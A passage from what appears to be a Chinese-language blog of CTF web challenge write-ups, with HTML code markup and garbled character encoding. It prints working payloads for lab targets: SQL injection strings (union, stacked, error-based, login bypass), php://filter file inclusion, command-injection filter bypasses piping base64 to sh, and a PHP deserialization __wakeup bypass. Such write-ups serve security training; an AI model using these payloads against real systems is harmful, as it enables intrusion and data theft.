class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//ç™½åå•è·Ÿåç»­å‡½æ•°é…åˆä½¿ç”¨</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123; <span class="comment">//ç¡®å®šæ˜¯å¦æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//æäº¤çš„å‚æ•°ä¸­æ˜¯å¦åœ¨ç™½åå•</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr( <span class="comment">//è¿‡æ»¤é—®å·</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//å†æ¬¡éªŒè¯ç™½åå•</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);  <span class="comment">//å°†æäº¤çš„å‚æ•°è¿›è¡Œurlè§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(  <span class="comment">//è¿‡æ»¤é—®å·</span></span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//å†æ¬¡éªŒè¯ç™½åå•</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è§£é¢˜ç›¸å…³çŸ¥è¯†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">**mb_strpos()**ï¼šè¿”å›è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line"><span class="comment">// mb_strpos (haystack ,needle )</span></span><br><span class="line"><span class="comment">// haystackï¼šè¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">// needleï¼šè¦æœç´¢çš„å­—ç¬¦ä¸²</span></span><br><span class="line">**mb_substr()** å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚</span><br><span class="line"><span class="comment">//str å¿…éœ€ã€‚ä»è¯¥ string ä¸­æå–å­å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">//start å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚</span></span><br><span class="line"><span class="comment">//ength å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾</span></span><br><span class="line">request()<span class="comment">//å¯ä»¥ä»¥getæˆ–è€…postæäº¤å‚æ•°</span></span><br><span class="line"><span class="keyword">include</span> <span class="comment">//æ–‡ä»¶åŒ…å«</span></span><br><span class="line"><span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span><span class="comment">//å°†$_pageåæ‹¼æ¥.</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">&amp;&amp; <span class="title">emmm</span>::<span class="title">checkFile</span>(<span class="params"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function">ä¸Šé¢è¿™ä»£ç è¡¨ç¤º å°†<span class="title">request</span>çš„<span class="title">file</span>å€¼ ä¼ å…¥$<span class="title">page</span>ï¼Œå…¶å®å°±æ˜¯å°†<span class="title">file</span>å‚æ•°ä¼ å…¥åˆ°<span class="title">page</span>ä¸­</span></span><br><span class="line"><span class="function">&amp;å¼•ç”¨ä¼ é€’å˜é‡ã€‚è¿™æ˜¯é€šè¿‡åœ¨å‡½æ•°å†…å»ºç«‹ä¸€ä¸ªæœ¬åœ°å˜é‡å¹¶ä¸”è¯¥å˜é‡åœ¨å‘¼å«èŒƒå›´å†…å¼•ç”¨äº†åŒä¸€ä¸ªå†…å®¹æ¥å®ç°çš„ã€‚ä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">foo</span> (<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123; <span class="variable">$var</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line">foo (<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å°†ä½¿ <span class="variable">$a</span> å˜æˆ <span class="number">6</span>ã€‚è¿™æ˜¯å› ä¸ºåœ¨ foo å‡½æ•°ä¸­å˜é‡ <span class="variable">$var</span> æŒ‡å‘äº†å’Œ <span class="variable">$a</span> æŒ‡å‘çš„åŒä¸€ä¸ªå†…å®¹ã€‚</span><br></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>è¿‡æ»¤</p><p><code>select|update|delete|drop|insert|where</code></p><p>ç»•è¿‡ï¼Œè€ƒè™‘æŠ¥é”™æ³¨å…¥</p><p><code>1&#39; and extractvalue(1,concat(&#39;~&#39;,database()))%23</code></p><p>ä½†å¾ˆå¤šå…³é”®å­—è¢«è¿‡æ»¤ï¼Œè€ƒè™‘å †å æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;;use supersqli;show tables;#</span></span><br><span class="line"><span class="string">-1&#x27;</span>;<span class="keyword">use</span> <span class="title">supersqli</span>;show columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="comment">#</span></span><br><span class="line">-<span class="number">1</span><span class="string">&#x27;;useÂ supersqli;setÂ @sql=concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>electÂ `flag`Â <span class="keyword">from</span>Â `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPAREÂ stmt1Â FROMÂ @sql;EXECUTEÂ stmt1;#</span></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>æ ¸å¿ƒæ€è·¯</p><p><code>setÂ sql_mode=pipes_as_concat;</code></p><p>Payload:</p><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>ä¸‡èƒ½å¯†ç </p><p><code>check.php?username=admin%27or+1%3D1+%23&amp;password=dawd</code></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>ä¸€è·¯ç‚¹ï¼ŒæŠ“åŒ…åœ¨302é¡µé¢æ‰¾åˆ°secr3t.phpï¼Œæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Â Â Â Â highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">Â Â Â Â error_reporting(<span class="number">0</span>);</span><br><span class="line">Â Â Â Â <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>,Â <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;OhÂ no!&quot;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">exit</span>();</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="keyword">include</span>(<span class="variable">$file</span>);Â </span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨file=php://filter/convert.base64-encode/resource=flag.phpæ¥è¯»å°±å¥½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;56d32da4-1a02-4eb1-a01f-c140abc88a4b&#125;&#x27;</span>;</span><br><span class="line">                <span class="variable">$secret</span> = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;56d32da4-1a02-4eb1-a01f-c140abc88a4b&#125;&#x27;</span>;</span><br><span class="line">                <span class="variable">$secret</span> = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>tornadoçš„cookie_secretæ–‡æ¡£</p><p><a href="https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret">https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret</a></p><p>å½“MainHandlerä¼ é€’å€¼æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªåå«settingsçš„dictï¼Œè€Œcookie_secretå°±åœ¨é‡Œé¢ã€‚å¹¶ä¸”ï¼Œsettingsä¼šéšç€MainHandlerä¼ é€’åˆ°å‰ç«¯å»ã€‚å³å¯ä»¥åœ¨handler.settingsä¸­æ‰¾åˆ°cookie_secretçš„å€¼ï¼Œç„¶åè·Ÿç€å®ƒçš„hintåšå°±å¯ä»¥äº†</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p><code>php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>order%<span class="number">20</span>by%<span class="number">204</span>%<span class="number">23</span> æ³¨å‡ºåªæœ‰<span class="number">3</span>ä¸ªå­—æ®µ</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span> æ‰¾åˆ°æ˜¾ä½<span class="number">2</span>å’Œ<span class="number">3</span></span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,database(),<span class="number">3</span>%<span class="number">23</span> æ•°æ®åº“ågeek</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(table_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=%<span class="number">27</span>geek%<span class="number">27</span>),<span class="number">3</span>%<span class="number">23</span> è¡¨ågeekuser,l0ve1ysq1</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=%<span class="number">27</span>geek%<span class="number">27</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=%<span class="number">27</span>l0ve1ysq1%<span class="number">27</span>),<span class="number">3</span>%<span class="number">23</span> å­—æ®µåid,username,password</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(username,%<span class="number">200</span>x5e,%<span class="number">20</span>password)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>geek.l0ve1ysq1),<span class="number">3</span>%<span class="number">23</span> è·å–å­—æ®µå†…å®¹ï¼Œç„¶åæ‰¾åˆ°flag</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ï¼Œå¦‚%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)</p><p>è¿‡æ»¤äº†&quot;&#39;ï¼Œç”¨chr()ç»•è¿‡%20num=var_dump(scandir(chr(47)))å¾—åˆ°åˆ—è¡¨</p><p>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))å¾—åˆ°flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p>è¿™é¢˜çš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">22</span>|<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br><span class="line">?ip=<span class="number">22</span>|ls|xargs$IFS$<span class="number">1</span>cat</span><br><span class="line">?ip=<span class="number">22</span>|cat$IFS$<span class="number">1</span>`ls`</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>POSTï¼šSyc=var_dump(file_get_contents(&#39;/flag&#39;));</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>ss|cat /flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>ååºåˆ—åŒ–åŠ¡å¿…ä½¿ç”¨pythonæ¥çœ‹ï¼Œç»•è¿‡__wakeupå‡½æ•°åªç”¨æŠŠè¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼æ”¹å¤§å°±å¯ä»¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1/www/111.php&quot;</span>)</span><br><span class="line"><span class="keyword">print</span>(repr(resp.text))</span><br><span class="line"><span class="comment"># O:4:&quot;Name&quot;:2:&#123;s:14:&quot;\x00Name\x00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\x00Name\x00password&quot;;i:100;&#125;</span></span><br><span class="line">xx = <span class="string">&#x27;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\x00Name\x00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\x00Name\x00password&quot;;i:100;&#125;&#x27;</span></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://96d1b3c9-16f6-44e8-a10e-bea5badd78c5.node3.buuoj.cn/?select=&quot;</span>+ xx)</span><br><span class="line"><span class="keyword">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>111.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 